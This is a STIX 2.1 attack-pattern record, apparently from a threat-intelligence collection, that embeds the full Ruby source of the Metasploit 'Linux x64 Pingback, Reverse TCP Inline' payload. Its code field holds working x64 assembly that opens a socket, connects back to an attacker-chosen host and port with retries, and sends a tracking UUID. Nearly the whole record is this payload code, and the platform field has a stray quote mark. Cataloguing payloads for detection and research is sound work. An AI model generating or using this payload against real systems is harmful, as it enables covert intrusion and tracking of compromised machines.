{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f381cb1b-d43b-4a5a-a831-0fb7d42fb1a1",
    "created": "2024-08-14T16:33:19.459618Z",
    "modified": "2024-08-14T16:33:19.459621Z",
    "name": "Linux x64 Pingback, Reverse TCP Inline",
    "description": "Connect back to attacker and report UUID (Linux x64)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/x64/pingback_reverse_tcp.rb",
            "external_id": "pingback_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nmodule MetasploitModule\n\n  CachedSize = 125\n\n  include Msf::Payload::Linux\n  include Msf::Payload::Single\n  include Msf::Payload::Pingback\n  include Msf::Payload::Pingback::Options\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux x64 Pingback, Reverse TCP Inline',\n      'Description'   => 'Connect back to attacker and report UUID (Linux x64)',\n      'Author'        => [ 'bwatters-r7' ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_X64,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::Pingback\n    ))\n    def generate(opts={})\n      # 22 -> \"0x00,0x16\"\n      # 4444 -> \"0x11,0x5c\"\n      encoded_port = [datastore['LPORT'].to_i,2].pack(\"vn\").unpack(\"N\").first\n      encoded_host = Rex::Socket.addr_aton(datastore['LHOST']||\"127.127.127.127\").unpack(\"V\").first\n      encoded_host_port = \"0x%.8x%.8x\" % [encoded_host, encoded_port]\n      retry_count = [datastore['ReverseConnectRetries'].to_i, 1].max\n\n      self.pingback_uuid ||= self.generate_pingback_uuid\n      uuid_as_db = \"0x\" + self.pingback_uuid.chars.each_slice(2).map(&:join).join(\",0x\")\n      seconds = 5.0\n      sleep_seconds = seconds.to_i\n      sleep_nanoseconds = (seconds % 1 * 1_000_000_000).to_i\n\n      asm = %Q^\n        push   #{retry_count}        ; retry counter\n        pop    r9\n        push   rsi\n        push   rax\n        push   0x29\n        pop    rax\n        cdq\n        push   0x2\n        pop    rdi\n        push   0x1\n        pop    rsi\n        syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)\n        test   rax, rax\n        js failed\n\n        xchg   rdi, rax\n\n      connect:\n        mov    rcx, #{encoded_host_port}\n        push   rcx\n        mov    rsi, rsp\n        push   0x10\n        pop    rdx\n        push   0x2a\n        pop    rax\n        syscall ; connect(3, {sa_family=AF_INET, LPORT, LHOST, 16)\n        pop    rcx\n        test   rax, rax\n        jns    send_pingback\n\n      handle_failure:\n        dec    r9\n        jz     failed\n        push   rdi\n        push   0x23\n        pop    rax\n        push   0x#{sleep_nanoseconds.to_s(16)}\n        push   0x#{sleep_seconds.to_s(16)}\n        mov    rdi, rsp\n        xor    rsi, rsi\n        syscall                      ; sys_nanosleep\n        pop    rcx\n        pop    rcx\n        pop    rdi\n        test   rax, rax\n        jns    connect\n\n      failed:\n        push   0x3c\n        pop    rax\n        push   0x1\n        pop    rdi\n        syscall ; exit(1)\n\n      send_pingback:\n        push #{uuid_as_db.split(\",\").length} ; length of the PINGBACK UUID\n        pop rdx\n        call get_uuid_address         ; put uuid buffer on the stack\n        db #{uuid_as_db}  ; PINGBACK_UUID\n\n      get_uuid_address:\n        pop rsi                       ; UUID address\n        xor rax, rax\n        inc rax\n        syscall                      ; sys_write\n\n      jmp failed\n      ^\n      Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}